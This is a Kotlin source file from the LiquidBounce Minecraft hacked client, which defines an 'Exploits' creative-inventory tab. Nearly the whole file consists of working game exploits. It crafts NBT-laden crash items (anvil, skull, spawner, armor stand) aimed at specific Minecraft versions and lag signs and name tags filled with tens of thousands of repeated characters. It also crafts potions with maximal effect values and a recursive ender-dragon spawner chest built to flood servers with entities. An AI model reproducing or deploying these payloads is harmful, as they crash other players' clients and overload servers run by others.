/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.tabs

import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.item.ItemUtils
import net.ccbluex.liquidbounce.utils.timer.TimeUtils
import net.minecraft.creativetab.CreativeTabs
import net.minecraft.init.Blocks
import net.minecraft.init.Items
import net.minecraft.item.Item
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList

class ExploitsTab : CreativeTabs("Exploits")
{

    /**
     * Initialize of exploits tab
     */
    init
    {
        backgroundImageName = "item_search.png"
    }

    /**
     * Return icon item of tab
     *
     * @return icon item
     */
    override fun getTabIconItem(): Item = Items.potionitem

    /**
     * Return name of tab
     *
     * @return tab name
     */
    override fun getTranslatedTabLabel() = "Exploits"

    /**
     * @return searchbar status
     */
    override fun hasSearchBar() = true

    /**
     * Add all items to tab
     *
     * @param itemList list of tab items
     */
    override fun displayAllReleventItems(itemList: MutableList<ItemStack>)
    {
        // Create troll potion
        val trollPotion = ItemStack(Items.potionitem)

        trollPotion.itemDamage = 16395

        val trollPotionEffects = NBTTagList()

        (1..27).map {
            val effect = NBTTagCompound()
            effect.setInteger("Amplifier", Integer.MAX_VALUE)
            effect.setInteger("Duration", Integer.MAX_VALUE)
            effect.setInteger("Id", it)
            effect
        }.forEach(trollPotionEffects::appendTag)

        trollPotion.setTagInfo("CustomPotionEffects", trollPotionEffects)
        trollPotion.setStackDisplayName("\u00A7c\u00A7lTroll\u00A76\u00A7lPotion")
        itemList.add(trollPotion)

        // Create kill potion
        val killPotion = ItemStack(Items.potionitem)
        killPotion.itemDamage = 16395
        val effect = NBTTagCompound()
        effect.setInteger("Amplifier", 125)
        effect.setInteger("Duration", 2000)
        effect.setInteger("Id", 6)
        val effects = NBTTagList()
        effects.appendTag(effect)
        killPotion.setTagInfo("CustomPotionEffects", effects)
        killPotion.setStackDisplayName("\u00A7c\u00A7lKill\u00A76\u00A7lPotion")
        itemList.add(killPotion)

        // Create crash anvil for mc 1.8
        val crashAnvil = ItemStack(Blocks.anvil)
        crashAnvil.setStackDisplayName("\u00A78Crash\u00A7c\u00A7lAnvil \u00A77| \u00A7cmc1.8-mc1.8")
        crashAnvil.itemDamage = 16384
        itemList.add(crashAnvil)

        // Create crash head for mc 1.8 ~ 1.10
        val crashHead = ItemStack(Items.skull)
        val compound = NBTTagCompound()
        compound.setString("SkullOwner", " ")
        crashHead.tagCompound = compound
        crashHead.setStackDisplayName("\u00A78Crash\u00A76\u00A7lHead \u00A77| \u00A7cmc1.8-mc1.10")
        itemList.add(crashHead)

        // Add crash spawner
        ItemUtils.createItem("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Crash\u00A7c\u00A7lSpawner \u00A77| \u00A7cmc1.8-mc1.8")) }

        // Create crashstand for mc 1.10
        ItemUtils.createItem("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Crash\u00A72\u00A7lStand \u00A77| \u00A7cmc1.10")) }

        // TODO: Make a fix for it (Make LagSign and LagTag doesn't work for me)
        // Create lag sign (LiquidBounce type A)
        ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagStringLB\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagStringLB\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagStringLB\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagStringLB\\\"}\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Lag\u00A72\u00A7lSign (LiquidBounce type A, 1500 loops) \u00A77| \u00A7cmc1.8")) }

        // Create lag sign (WURST type)
        ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagStringWURST\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagStringWURST\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagStringWURST\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagStringWURST\\\"}\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Lag\u00A72\u00A7lSign (WURST type, 18000 loops) \u00A77| \u00A7cmc1.8")) }

        // Create lag sign (LiquidBounce type B)
        ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagStringLB2\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagStringLB2\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagStringLB2\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagStringLB2\\\"}\"}}")?.let { itemList.add(it.setStackDisplayName("\u00A78Lag\u00A72\u00A7lSign (LiquidBounce type B, 600 loops) \u00A77| \u00A7cmc1.8")) }

        // Create spawn eggs of special mobs
        ItemUtils.createItem("spawn_egg 1 64")?.let(itemList::add)
        ItemUtils.createItem("spawn_egg 1 63")?.let(itemList::add)
        ItemUtils.createItem("spawn_egg 1 53")?.let(itemList::add)

        // Create lag tag (LiquidBounce type A)
        ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagStringLB\"}}")?.let(itemList::add)

        // Create lag tag (WURST type)
        ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagStringWURST\"}}")?.let(itemList::add)

        // Create lag tag (LiquidBounce type B)
        ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagStringLB2\"}}")?.let(itemList::add)

        // Create infinity firework
        ItemUtils.createItem("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}")?.let { itemList.add(it.setStackDisplayName("\u00A7cInfinity \u00A7a\u00A7lFirework")) }

        // Create enderdragon loop item
        ItemUtils.createItem("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s}],value:\"Chest\",Lock:\"\"}}")?.setStackDisplayName("\u00A7c\u00A7lEnder\u00A7c\u00A7a\u00A7lDragon \u00A7bSpawner Spawner Chest")?.let(itemList::add)
    }

    companion object
    {
        val lagStringLB: String // LiquidBounce type A
        val lagStringWURST: String // WURST type
        val lagStringLB2: String // LiquidBounce type B

        init
        {
            val nanoTime = System.nanoTime()

            val lbLagStringBuilder = StringBuilder(16500)
            val wurstLagStringBuilder = StringBuilder(18000)
            val lbLagString2Builder = java.lang.StringBuilder(31800)

            repeat(1500) { lbLagStringBuilder.append("/(!\u00A7()%/\u00A7)=") }
            repeat(18000) { wurstLagStringBuilder.append('#') }
            repeat(600) { lbLagString2Builder.append("\u00A7k\u00A7/\u00A7r\u00A7k\u00A7(\u00A7r\u00A7k\u00A7!\u00A7r\u00A7k\u00A7(\u00A7r\u00A7k)\u00A7r\u00A7k\u00A7%\u00A7r\u00A7k\u00A7/\u00A7r\u00A7k\u00A7)\u00A7r\u00A7k\u00A7=\u00A7r") }

            lagStringLB = "$lbLagStringBuilder"
            lagStringWURST = "$wurstLagStringBuilder"
            lagStringLB2 = "$lbLagString2Builder"

            ClientUtils.logger.info("Took {} to generate lag strings.", TimeUtils.nanosecondsToString(System.nanoTime() - nanoTime))
        }
    }
}
